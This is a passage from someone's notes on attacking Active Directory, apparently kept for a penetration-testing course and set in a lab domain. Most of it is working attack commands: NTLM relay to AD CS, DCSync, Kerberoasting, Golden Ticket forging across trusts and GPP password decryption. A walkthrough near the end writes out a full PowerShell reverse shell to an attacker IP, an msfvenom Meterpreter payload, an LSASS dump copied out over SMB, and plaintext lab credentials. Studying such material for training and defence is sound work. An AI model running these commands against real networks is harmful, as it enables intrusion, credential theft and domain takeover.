|---|---|
|`sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController`|Starts an **NTLM relay** on the Attack Machine. It waits for the DC's authentication and relays it to the **AD CS Certificate Authority** to request a Domain Controller certificate.|

**Run this first and keep it running.**


### ii. PetitPotam — Force the DC to Authenticate

#### Download PetitPotam

|Command|What it does|
|---|---|
|`git clone https://github.com/topotam/PetitPotam.git`|Downloads the PetitPotam tool to the Linux Attack Machine.|
#### Run PetitPotam

|Command|What it does|
|---|---|
|`python3 PetitPotam.py 172.16.5.225 172.16.5.5`|Forces the target Domain Controller to authenticate to the specified attack host. The authentication is then caught by the running `ntlmrelayx` relay.|

So the idea is simply:  **PetitPotam forces the DC to authenticate → ntlmrelayx catches and relays it.**



### iii. Get a TGT with the DC Certificate — `gettgtpkinit.py`

|Command|What it does|
|---|---|
|`python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache`|Uses the captured **DC certificate** to request a **Kerberos TGT** for the Domain Controller and saves it as `dc01.ccache`.|

The important result is: `dc01.ccache`, This file contains the Kerberos ticket.



### iv. Check the Kerberos Ticket — `klist`

|Command|What it does|
|---|---|
|`klist`|Displays the Kerberos tickets stored in the current credential cache (`ccache`).|

Use this to confirm that the TGT was obtained.



### v. Get the DC NT Hash — `getnthash.py`

|Command|What it does|
|---|---|
|`python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$`|Uses the obtained key material to retrieve the **NT hash of the Domain Controller machine account**.|

This gives  the DC's NT hash, which can be used for further authentication.



### vi. DCSync — `secretsdump.py`

#### Option 1: Using the Kerberos Ticket

| Command                                                                                                                       | What it does                                                                                                                                                                                 |
| ----------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` | Here you already have a **Kerberos TGT/ccache**, so `secretsdump.py` uses Kerberos authentication and the DC machine account to perform **DCSync** and retrieve the Administrator NTLM hash. |

#### Option 2: Using the DC NT Hash

| Command                                                                                                                                                            | What it does                                                                                                                                                   |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba` | Performs **DCSync**,  instead of using the Kerberos ticket, you authenticate using the **DC machine account's NT hash**. and retrieves the Administrator hash. |

**DCSync = ask the Domain Controller for password hashes using replication privileges.**



### vi. Confirm Admin Access

|Command|What it does|
|---|---|
|`crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf`|Tests whether the recovered Administrator NTLM hash provides SMB administrator access to the Domain Controller.|



### vii. Windows Method 
#### Option 1: `Rubeus`

If I am working from a **Windows machine**, I can use Rubeus instead.

| Command                                                                                           | What it does                                                                                                                              |
| ------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------- |
| `.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt` | Uses the DC machine account's certificate to request a TGT and injects the ticket into the current Windows session (**Pass-the-Ticket**). |
| `klist`                                                                                           | Confirming the Ticket is in Memory                                                                                                        |

#### Option 2: `Mimikatz`

|Command|What it does|
|---|---|
|`mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt`|Performs a **DCSync** attack with Mimikatz to request the `krbtgt` account's password hash.|

---
---


# Section 26 — Miscellaneous Misconfigurations

**Exchange Windows Permissions** is a powerful Exchange group because members can modify the **domain DACL (rules that say who can do what)**, which can potentially be abused to get **DCSync** privileges. **PrivExchange** can force Exchange to authenticate, while the **Printer Bug** can force a Windows machine to authenticate. These authentications can potentially be **relayed to LDAP**, which is simply a protocol used to **talk to Active Directory** and read or change AD information. 
So the **main lesson of this section** is:  **Don't only enumerate users, groups, and computers. Look at the weird stuff too. A misconfiguration in Exchange, GPO, DNS, SYSVOL, Kerberos, certificates, or LDAP might give you another way forward.**

---

## 1. Check for Print Spooler Vulnerability

|Step|Command|What it does|
|---|---|---|
|1|`Import-Module .\SecurityAssessment.ps1`|Loads the SecurityAssessment module.|
|2|`Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL`|Checks whether the target is vulnerable to the **MS-PRN / Printer Bug**.|

---

## 2. Enumerate AD DNS Records — `adidnsdump`

|Step|Command|What it does|
|---|---|---|
|1|`adidnsdump -u inlanefreight\\forend ldap://172.16.5.5`|Uses **LDAP** to enumerate DNS records from Active Directory.|
|2|`adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r`|`-r` tries to resolve unknown records using **A-record queries**.|

---

## 3. Enumerate Domain Users — PowerView

|Step|Command|What it does|
|---|---|---|
|1|`Get-DomainUser * \| Select-Object samaccountname,description \|Where-Object {$_.Description -ne $null}`|Lists domain users and shows their **username and non-empty description**.|

---

## 4. Find `PASSWD_NOTREQD` Accounts

| Step | Command                                                                                       | What it does                                                           |
| ---- | --------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------- |
| 1    | `Get-DomainUser -UACFilter PASSWD_NOTREQD \| Select-Object samaccountname,useraccountcontrol` | Finds accounts where **Active Directory does not require a password**. |

---

## 5. Check SYSVOL Scripts

|Step|Command|What it does|
|---|---|---|
|1|`ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts`|Lists files in the **SYSVOL scripts folder** on the Domain Controller.|

---

# Group Policy Enumeration & Attacks

When a **Group Policy Preference (GPP)** is created, an `.xml` file can be stored in the **SYSVOL** share. These files may contain credentials, so SYSVOL is worth checking.

---

## 6. Find & Decrypt GPP Passwords

|Step|Command|What it does|
|---|---|---|
|1|`crackmapexec smb -L \| grep gpp`|Searches CrackMapExec for **GPP-related modules**.|
|2|`crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin`|Searches the target's **SYSVOL** for credentials stored by GPP.|
|3|`gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE`|Decrypts the captured **GPP password**.|

**Remember:**

> **GPP → SYSVOL → find stored password → decrypt it**

---

## 7. Enumerate GPOs

enumerate → understand what exists → find who controls it → identify possible attacks → abuse the weakness if one exists.

|Step|Command|What it does|
|---|---|---|
|1|`Get-DomainGPO \| select displayname`|PowerView command that lists **GPO names**.|
|2|`Get-GPO -All \| Select DisplayName`|PowerShell command that lists **all GPO names**.|

---

## 8. Check Who Can Modify a GPO

|Step|Command|What it does|
|---|---|---|
|1|`$sid=Convert-NameToSid "Domain Users"`|Converts **Domain Users** into its SID and saves it in `$sid`.|
|2|`Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid`|Checks whether **Domain Users** has permissions over GPOs.|
If a low-privileged user/group can modify an important GPO, that may create an attack path.

---

## 9. Find a GPO Name from Its GUID

|Step|Command|What it does|
|---|---|---|
|1|`Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532`|Uses the GPO's **GUID** to find its name.|

---

# AS-REP Roasting (Authenticate Service Response Roasting)

**AS-REP Roasting** looks for domain accounts that **do not require Kerberos pre-authentication**. These accounts can potentially return an AS-REP response that can be captured and cracked offline.

---

## 10. Find Users Without Kerberos Pre-Authentication

### Option 1: PowerView

| Step | Command                                                                                                  | What it does                                                                                  |
| ---- | -------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| 1    | `Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl` | Finds users with **`DONT_REQ_PREAUTH`**, meaning Kerberos pre-authentication is not required. |

### Option 2: Kerbrute

| Step | Command                                                                    | What it does                                                                                                            |
| ---- | -------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- |
| 1    | `kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt` | Checks the username list against the domain and can identify users that **do not require Kerberos pre-authentication**. |

---

## 11. Perform AS-REP Roasting to get the hash

### Option 1: Rubeus (Windows method)

| Step | Command                                                         | What it does                                                                      |
| ---- | --------------------------------------------------------------- | --------------------------------------------------------------------------------- |
| 1    | `.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat` | Requests the AS-REP response for the user and formats the result for **Hashcat**. |

### Option 2: GetNPUsers.py (Linux/Impacket method)

| Command                                                                                   | What it does                                                                                                                                       |
| ----------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------- |
| `GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users` | Checks the supplied users for accounts without Kerberos pre-authentication and retrieves AS-REP hashes for roastable users file got from kerbrute. |


---

## 12. Crack the AS-REP Hash

| Step | Command                                                             | What it does                                                        |
| ---- | ------------------------------------------------------------------- | ------------------------------------------------------------------- |
| 1    | `hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt` | Uses **Hashcat** and `rockyou.txt` to try to crack the AS-REP hash. |

---
---



# Section 27,28 —  Attacking Domain Trusts - Child -> Parent Trusts - from Windows

The main idea is:

```text

Trust Enumeration → Find Child/Parent Domains → Get SIDs → Get KRBTGT Hash → Golden Ticket → Enterprise Admin → Parent Domain
```

### 1. Import Active Directory Module

|Where|Command|What it does|
|---|---|---|
|**Windows host**|`Import-Module activedirectory`|Imports the Active Directory PowerShell module so I can use AD commands.|

---

### 2. Enumerate Domain Trusts

#### Option 1 — PowerShell AD

|Where|Command|What it does|
|---|---|---|
|**Windows host**|`Get-ADTrust -Filter *`|Enumerates the domain's trust relationships.|

#### Option 2 — PowerView

|Where|Command|What it does|
|---|---|---|
|**Windows host**|`Get-DomainTrust`|Enumerates domain trusts.|
|**Windows host**|`Get-DomainTrustMapping`|Maps trust relationships between domains.|

#### Option 3 — `netdom`

|Where|Command|What it does|
|---|---|---|
|**Windows CMD**|`netdom query /domain:inlanefreight.local trust`|Lists the trust relationships for `inlanefreight.local`.|

`<->` indicates a **bidirectional trust**.

---

### 3. Query Domain Controllers with `netdom`

|Where|Command|What it does|
|---|---|---|
|**Windows CMD**|`netdom query /domain:inlanefreight.local dc`|Lists the Domain Controllers associated with the domain.|

---

### 4. Query Workstations and Servers with `netdom`

|Where|Command|What it does|
|---|---|---|
|**Windows CMD**|`netdom query /domain:inlanefreight.local workstation`|Lists workstation and computer accounts associated with the domain.|

---

### 5. Visualize Trusts with BloodHound

|Where|Tool|What it does|
|---|---|---|
|**BloodHound**|`Map Domain Trusts`|Pre-built query that shows domain trust relationships.|

---

### 6. Enumerate Users in the Child Domain

|Where|Command|What it does|
|---|---|---|
|**Windows host**|`Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL \| select SamAccountName`|Lists users in the `LOGISTICS.INLANEFREIGHT.LOCAL` child domain.|

---

### 7. Get the Child Domain SID

#### Option 1 — PowerView

|Where|Command|What it does|
|---|---|---|
|**Windows host**|`Get-DomainSID`|Gets the SID of the domain I am currently operating in.|

Remember:

```text
Domain SID + RID = Object SID
```

---

### 8. Find the Enterprise Admins SID

The **Enterprise Admins** group is important because it provides **forest-level administrative privileges**.

#### Option 1 — PowerView

|Where|Command|What it does|
|---|---|---|
|**Windows host**|`Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" \| select distinguishedname,objectsid`|Gets the Distinguished Name and SID of the Enterprise Admins group.|

---

### 9. Get the Child Domain KRBTGT Hash

The **KRBTGT account** is used by Kerberos to sign tickets for the domain.

#### Option 1 — Mimikatz

|Where|Command|What it does|
|---|---|---|
|**Windows host with required privileges**|`mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt`|Performs DCSync against the Domain Controller and obtains the child-domain KRBTGT hash.|

---

### 10. Create Golden Ticket

#### Option 1 — Mimikatz

|Where|Command|What it does|
|---|---|---|
|**Windows host with Mimikatz**|`mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt`|Creates a Golden Ticket for the child domain and adds the Enterprise Admins SID.|

#### Option 2 — Rubeus

|Where|Command|What it does|
|---|---|---|
|**Windows host with Rubeus**|`.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt`|Alternative to Mimikatz for creating and injecting a Golden Ticket.|

---

### 11. Test Access to the Domain Controller

|Where|Command|What it does|
|---|---|---|
|**Windows host with the ticket**|`klist`|Confirms that a Kerberos ticket is in memory.|
|**Windows host with the ticket**|`ls \\academy-ea-dc01.inlanefreight.local\c$`|Attempts to access the Domain Controller's administrative `C$` share.|

---

### 12. DCSync the Parent Domain

#### Option 1 — Mimikatz

|Where|Command|What it does|
|---|---|---|
|**Windows host with required privileges**|`mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm`|Performs DCSync against the parent domain and retrieves credential/replication data.|

When dealing with multiple domains and the target domain is not the same as the user's domain, specify the exact domain:

```text
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```

Remember:

```text
LSASS dump → credentials currently present on that Windows machine

DCSync → request AD replication data from the Domain Controller
```

---
---

# Section 29 — Attacking Domain Trusts - Child -> Parent Trusts - from Linux

### 1. Get the Child Domain SID

#### Impacket

| Where                    | Command                                                                                        | What it does                                               |
| ------------------------ | ---------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| **Linux Attack Machine** | `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`                      | Performs SID enumeration/brute forcing against the target. |
| **Linux Attack Machine** | `lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"` | Extracts the target domain SID.                            |

---

### 2. Find the Enterprise Admins SID

####  Impacket

|Where|Command|What it does|
|---|---|---|
|**Linux Attack Machine**|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"`|Finds the Enterprise Admins group and helps identify its SID.|

---

### 3. Get the Child Domain KRBTGT Hash

####  Impacket

|Where|Command|What it does|
|---|---|---|
|**Linux Attack Machine**|`secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt`|Performs the DCSync operation remotely and retrieves KRBTGT credential data.|

---

### 4. SID Brute Forcing

|Where|Command|What it does|
|---|---|---|
|**Linux Attack Machine**|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240`|Enumerates SIDs and can reveal users, groups, domain SID, and RIDs.|
|**Linux Attack Machine**|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 \| grep "Domain SID"`|Extracts the domain SID.|
|**Linux Attack Machine**|`lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"`|Searches around Enterprise Admins to identify its SID.|

---

### 5. Create Golden Ticket — `ticketer.py`

|Where|Command|What it does|
|---|---|---|
|**Linux Attack Machine**|`ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker`|Creates a Golden Ticket using the child-domain KRBTGT hash and Enterprise Admins SID.|

The important idea is:

```text
Child KRBTGT hash + Child Domain SID + Parent Enterprise Admins SID
→ Golden Ticket for "hacker"
```

The result is:

```text
hacker.ccache
```

on the Linux Attack Machine.

---

### 6. Tell Linux to Use the Ticket

|Where|Command|What it does|
|---|---|---|
|**Linux Attack Machine**|`export KRB5CCNAME=hacker.ccache`|Tells Kerberos-aware Linux tools to use the `hacker.ccache` ticket.|

---

### 7. Use the Ticket with PsExec

|Where|Command|What it does|
|---|---|---|
|**Linux Attack Machine**|`psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5`|Uses the Kerberos ticket to authenticate to the target Domain Controller and establish a remote shell.|

---

### 8. Automated Child → Parent Attack

| Where                    | Command                                                                               | What it does                                                                                            |
| ------------------------ | ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- |
| **Linux Attack Machine** | `raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm` | Automates the child-domain → parent-domain escalation process when the required conditions are present. |

### The easiest sentence to remember

> **Enumerate the trust → identify the child and parent → collect the required SID and KRBTGT information → forge a Golden Ticket → use Enterprise Admin privileges to reach the parent domain.**


---
---


# Section 30 - Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

The main idea is:

```text
Find SPN → Identify Service Account → Kerberoast → Find Foreign Group Members → Access Target Domain
```

---
### Step 1 — Find Accounts with SPNs

| Option        | Command                                                                       | What it does                                                                                                                    |
| ------------- | ----------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| **PowerView** | `Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL \| select SamAccountName` | Finds user accounts in `FREIGHTLOGISTICS.LOCAL` that have an SPN. These accounts can potentially be targeted for Kerberoasting. |

---

### Step 2 — Investigate the Service Account

| Option        | Command                                                                                              | What it does                                                                |
| ------------- | ---------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------- |
| **PowerView** | `Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof` | Checks the `mssqlsvc` service account and shows which groups it belongs to. |

This helps me understand whether the service account has useful privileges.

---

### Step 3 — Kerberoast the Service Account

| Option     | Command                                                                         | What it does                                                                              |
| ---------- | ------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| **Rubeus** | `.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap` | Requests the Kerberos TGS for `mssqlsvc`, giving me material that can be cracked offline. |

---

### Step 4 — Find Foreign Group Members

|Option|Command|What it does|
|---|---|---|
|**PowerView**|`Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL`|Finds groups in the target domain that contain users/groups from another domain.|

This is useful because a user from another domain may have access or privileges in `FREIGHTLOGISTICS.LOCAL`.

---

### Step 5 — Connect to the Target Windows System

| Option         | Command                                                                                                        | What it does                                                                                    |
| -------------- | -------------------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------- |
| **PowerShell** | `Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator` | Uses PowerShell Remoting to connect to the target Windows system with the supplied credentials. |

---

# Section 31 - Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

### Step 1 — Request the TGS with Impacket

| Option                        | Command                                                                                  | What it does                                                      |
| ----------------------------- | ---------------------------------------------------------------------------------------- | ----------------------------------------------------------------- |
| **Impacket `GetUserSPNs.py`** | `GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley` | Requests TGS tickets for accounts with SPNs in the target domain. |

This is the **Linux alternative to using Rubeus**.

```text
Windows → Rubeus
Linux   → GetUserSPNs.py
```

---

### Step 2 — Collect BloodHound Data

|Option|Command|What it does|
|---|---|---|
|**BloodHound Python**|`bloodhound-python -d INLANEFREIGHT.LOCAL -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2`|Collects Active Directory information from the Linux Attack Machine for analysis in BloodHound.|

The command creates several `.json` files containing the collected AD data.

---

### Step 3 — Compress the BloodHound Data

|Option|Command|What it does|
|---|---|---|
|**Linux `zip`**|`zip -r ilfreight_bh.zip *.json`|Compresses all the BloodHound `.json` files into one `.zip` file so they can be uploaded into the BloodHound GUI.|


> **Windows → PowerView + Rubeus + PowerShell**  
> **Linux → Impacket + BloodHound Python + zip**

login to that window account:

`psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local -target-ip 172.16.5.238`


forend:Klmcargo2@172.16.5.5

sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!

wley:transporter@4
sapsso account: pabloPICASSO



# Section 33 - Additional AD Auditing Techniques

|Tool|What it is|Why use it|When to use|
|---|---|---|---|
|**AD Explorer**|GUI tool for browsing Active Directory|View AD objects, attributes, permissions, and create **snapshots**|When I want to **browse AD or compare AD before/after changes**|
|**PingCastle**|AD security assessment tool|Finds **misconfigurations, vulnerabilities, trusts, risky settings**, and gives a security/risk report|When I want a **quick overall security assessment of the AD domain**|
|**Group3r**|Group Policy auditing tool|Finds **security issues and weaknesses in GPO settings**|When I specifically want to **audit Group Policy**|
|**ADRecon**|AD data collection/reporting tool|Collects a **large amount of AD information** into reports/CSV files|When I want **broad AD enumeration/auditing** and don't need stealth|



# AD Enumeration & Attacks - Skills Assessment Part I

## 1. Get the Initial Web Shell

I first went to the website's upload directory:

```text
http://10.129.204.37/uploads/antak.aspx
```

I logged in using the given credentials and got a **web shell**. I typed:

```text
help
```

The help output showed that PowerShell one-liner  could be used , so I created a reverse shell. On my **Attack Machine**, I started a Netcat listener:

```bash
nc -lvnp 4444
```

Then, from the web shell, I executed:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.192',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex ". { $data } 2>&1" | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

The connection came back to my Attack Machine.

---

## 2. Upgrade the Shell

The first shell was inconvenient, so I upgraded it to an interactive Bash shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gave me a much more usable shell.

---

## 3. Get the First Flag

I checked the Administrator's Desktop and found the first flag:

```text
JusT_g3tt1ng_st@rt3d!
```

This answered the first question.

---

## 4. Enumerate the Domain

For the second question, I first checked the password policy:

```cmd
net accounts
```

The password length was:

```text
1–24 characters
```

I then decided to enumerate domain users and their SPNs using **PowerView**. On my Attack Machine, I downloaded/hosted PowerView and transferred it to the target. On the target:

```powershell
IWR -Uri http://10.10.15.192:6666/PowerView.ps1 -OutFile C:\PowerView.ps1
```

---

## 5. Find Accounts With SPNs

I used PowerView:

```powershell
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

This showed several service accounts:

```text
adfsconnect/azure01.inlanefreight.local     azureconnect
backupjob/veam001.inlanefreight.local       backupjob
kadmin/changepw                             krbtgt
MSSQLSvc/DEVTEST.inlanefreight.local:1433   sqltest
MSSQLSvc/QA001.inlanefreight.local:1433     sqlqa
MSSQLSvc/SQL-DEV01.inlanefreight.local:1433 sqldev
MSSQLSvc/SQL01.inlanefreight.local:1433     svc_sql
MSSQLSvc/SQL02.inlanefreight.local:1433     sqlprod
```

The question specifically pointed toward:

```text
MSSQLSvc/SQL01.inlanefreight.local:1433
```

The account owning this SPN was:

```text
svc_sql
```

---

## 6. Kerberoast `svc_sql`

I requested a Kerberos service ticket for `svc_sql` and formatted it for Hashcat:

```powershell
Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat
```

I copied the resulting hash to my Attack Machine. The hash had line breaks, so I cleaned it first:

```bash
tr -d '[:space:]' < hash.txt > kerberoast.txt
```

Then I cracked it with Hashcat:

```bash
hashcat -m 13100 1.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt*
```

I recovered the password:

```text
lucky7
```

So I now had:

```text
Username: svc_sql
Password: lucky7
```

---

## 7. Try to Access SQL01 / MS01

I downloaded PowerUpSQL to the target:

```powershell
IWR -Uri http://10.10.15.192:6666/PowerUpSQL/PowerUpSQL.ps1 -OutFile C:\PowerUpSQL.ps1
```

Then imported it:

```powershell
Import-Module .\PowerUpSQL.ps1
```

I initially tried:

```powershell
Get-SQLQuery -Verbose -Instance "SQL01.inlanefreight.local,1433" -Username "inlanefreight\svc_sql" -Password "lucky7" -Query 'Select @@version'
```

This did not work. I then checked the network configuration:

```cmd
ipconfig
```

The machine had:

```text
172.16.6.100
255.255.0.0
```

So the internal network was:

```text
172.16.0.0/16
```

I tried scanning for SQL Server on port 1433:

```powershell
1..254 | % { $ip="172.16.6.$_"; $c=New-Object Net.Sockets.TcpClient; try { $c.ConnectAsync($ip,1433).Wait(200) | Out-Null; if($c.Connected){"$ip : 1433 OPEN"} } catch {} finally {$c.Close()} }
```

This did not give me what I needed. Because the question mentioned **MS01**, I checked its IP directly:

```powershell
[System.Net.Dns]::GetHostAddresses("MS01")

or just simply ping MS01
```

This resolved MS01 to:

```text
172.16.6.50
```

I also tried:

```powershell
Get-SQLQuery -Verbose -Instance "MS01.inlanefreight.local,1433" -Username "inlanefreight\svc_sql" -Password "lucky7" -Query 'Select @@version'
```

but SQL access was still not the path I needed.

---

## 8. Use the `svc_sql` Credentials for Windows Access

I realized that I should try using the credentials against the **Windows machine itself**, not only against SQL Server. I created a PowerShell credential object:

```powershell
$user = "inlanefreight\svc_sql"
$Password = ConvertTo-SecureString "lucky7" -AsPlainText -Force
$credentials = New-Object System.Management.Automation.PSCredential ($user, $Password)
```

Then:

```powershell
Enter-PSSession -ComputerName "MS01.inlanefreight.local" -Credential $credentials
```

This worked and gave me a PowerShell remoting session on MS01. However, the reverse Bash shell was inconvenient, so I decided to get a proper Meterpreter session.

---

## 9. Create a Meterpreter Payload as this was much easier to work with than the original reverse Bash shell.

On my Attack Machine:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.15.192 LPORT=5555 -f exe -o b.exe
```

In Metasploit, I configured the matching payload:

```text
windows/x64/meterpreter/reverse_https
```

I then hosted the payload and downloaded it to MS01:

```powershell
Invoke-WebRequest -Uri "http://10.10.15.192:1000/b.exe" -OutFile "C:\windows\system32\inetsrv\b.exe"
```

Then executed it:

```powershell
.\b.exe
```

I received a Meterpreter session. From the Meterpreter shell, I could also start PowerShell when needed:

```cmd
powershell.exe
```

---

## 10. Set Up SOCKS Pivoting

Now I wanted to reach other machines in the internal network from my Attack Machine. Inside Metasploit:

```text
use auxiliary/server/socks_proxy
```

Then:

```text
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run -j
```

`run -j` starts the SOCKS proxy as a background job.

---

## 11. Add the Internal Route

I then told Metasploit to route the internal network through my Meterpreter session. Inside Metasploit:

```text
use post/multi/manage/autoroute
```

Then:

```text
set SESSION 1
set SUBNET 172.16.6.0
run
```

I checked my ProxyChains configuration:

```bash
nano /etc/proxychains.conf
```

The SOCKS proxy was configured on:

```text
127.0.0.1:9050
```

---

## 12. Find RDP and SMB on MS01

From my Attack Machine:

```bash
proxychains nmap -p3389,445 -sT -Pn 172.16.6.50
```

I found that RDP was available. I initially tried:

```bash
proxychains xfreerdp /v:172.16.6.50 /u:"inlanefreight\svc_sql" /p:lucky7 /dynamic-resolution /drive:Share,/home/htb-student/Downloads
```

However, FreeRDP kept failing because of the Kerberos/RDP authentication issue. The important thing was that **SMB worked**.

---

## 13. Access MS01 Through SMB

From the Windows side:

```cmd
net use \\MS01\c$ /user:INLANEFREIGHT.LOCAL\svc_sql lucky7
```

Then I could access files on MS01. For example:

```cmd
type \\ms01\c$\Users\Administrator\Desktop\flag.txt
```

This gave me the flag for that question. So even though RDP was failing, I still had administrative SMB access to MS01.

---

## 14. Create an LSASS Dump

I checked the LSASS process:

```cmd
tasklist /FI "IMAGENAME eq lsass.exe"
```

I found its PID and created a dump using `comsvcs.dll`. For example:

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 664 C:\windows\system32\inetsrv\lsass.dmp full
```

The important part is that `664` was the LSASS PID on my machine. The PID can be different on another system.

---

## 15. Transfer the LSASS Dump

My Attack Machine could directly reach MS01, so I created an SMB share on my Attack Machine.

First:

```bash
sudo pkill -f smbserver
mkdir -p /tmp/share
sudo chmod 777 /tmp/share
sudo impacket-smbserver share /tmp/share -smb2support -username htb -password htb
```

On MS01:

```powershell
net use \\10.10.15.192\share /delete
net use \\10.10.15.192\share /user:htb htb
```

Then copied the dump:

```powershell
copy .\lsass.dmp \\10.10.15.192\share\lsass.dmp
```

On my Attack Machine:

```bash
ls -lh /tmp/share/
```

I then tried:

```bash
pypykatz lsa minidump /tmp/share/lsass.dmp
```

The LSASS dump did not give me the credentials I needed.

---

## 16. Create a Direct RDP Port Forward

Since RDP was open but FreeRDP through SOCKS was having authentication problems, I used Windows `netsh` port forwarding instead.

On the Windows pivot:

```cmd
netsh.exe interface portproxy add v4tov4 listenport=8888 listenaddress=10.129.156.237 connectport=3389 connectaddress=172.16.6.50
```

Here:

```text
10.129.156.237 → Windows pivot
172.16.6.50     → MS01
3389            → MS01 RDP
